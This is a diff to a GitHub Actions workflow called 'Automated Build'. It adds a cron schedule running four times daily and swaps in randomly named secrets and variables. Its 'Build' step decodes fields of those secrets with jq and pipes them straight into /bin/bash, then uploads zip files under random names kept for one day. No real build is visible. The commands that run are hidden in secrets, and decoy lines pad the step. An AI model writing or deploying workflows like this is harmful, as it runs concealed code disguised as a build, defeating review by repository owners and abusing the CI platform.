@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '56 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,20 +18,18 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          vhi4542: ${{ secrets.vhi4542 }}
+          ruu6: ${{ secrets.ruu6 }}
         run: |
-          printf '%s' "$vhi4542" | jq -r .k46 | /bin/bash
-          echo $k3 | jq -r .ypbfb152 | /bin/bash
-          printf '%s' "$k26" | jq -r .w12142 | /bin/bash
-          printf '%s' "$u9302" | jq -r .ja8 | /bin/bash
-          printf '%s' "$vbd9" | jq -r .lq0 | /bin/bash
-          printf '%s' "$ejc7" | jq -r .ibqsj1494 | /bin/bash
-          echo $uzfg307 | jq -r .q731 | /bin/bash
+          printf '%s' "$ruu6" | jq -r .u6048 | /bin/bash
+          printf '%s' "$vlo84" | jq -r .xbn79253 | /bin/bash
+          echo $aphx55 | jq -r .ukseu5633 | /bin/bash
+          printf '%s' "$gcp18445" | jq -r .xkf0 | /bin/bash
+          printf '%s' "$iv497" | jq -r .rq0605 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: P0OIvkMW
+          name: uy6XVYPT
           path: "*.zip"
           retention-days: 1
